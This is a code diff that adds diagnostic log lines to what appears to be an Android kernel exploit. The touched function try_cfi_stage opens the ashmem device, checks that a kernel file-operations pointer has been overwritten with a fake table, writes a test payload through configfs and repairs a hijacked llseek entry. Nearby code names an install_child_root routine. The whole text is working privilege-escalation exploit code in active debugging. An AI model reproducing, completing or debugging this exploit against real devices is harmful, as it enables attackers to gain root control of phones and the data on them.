@@ -244,20 +244,27 @@ int install_child_root(int fd) {
 
 int try_cfi_stage(void) {
   cfi_attempts++;
+  pr_info("DIAG: try_cfi_stage entry attempt=%d\n", cfi_attempts);
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
 
   if (fd < 0) {
+    pr_warning("DIAG: open_ashmem_device failed errno=%d\n", errno);
     cfi_last_step = 11;
     cfi_last_errno = errno;
     return 0;
   }
+  pr_info("DIAG: ashmem fd=%d\n", fd);
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  pr_info("DIAG: configfs_read_once misc_fops=%016zx fake_fops=%016zx\n",
+          misc_fops, fake_fops);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
+  pr_info("DIAG: configfs_read_once ret=%zd read=%016llx errno=%d\n",
+          pre_rb, (unsigned long long)pre_fops, errno);
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
@@ -268,6 +275,7 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+  pr_info("DIAG: fops overwrite confirmed, testing configfs write\n");
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
@@ -281,12 +289,15 @@ int try_cfi_stage(void) {
   }
   dirty = 1;
   cfi_dirty_seen = 1;
+  pr_info("DIAG: configfs write ok, repairing llseek\n");
 
   if (!repair_fake_fops_llseek(fd)) {
+    pr_warning("DIAG: repair_fake_fops_llseek failed errno=%d\n", errno);
     cfi_last_step = 2;
     cfi_last_errno = errno;
     goto fail;
   }
+  pr_info("DIAG: llseek repaired\n");
   cfi_read_slot_ret = sizeof(uint64_t);
   can_read_back = 1;
 
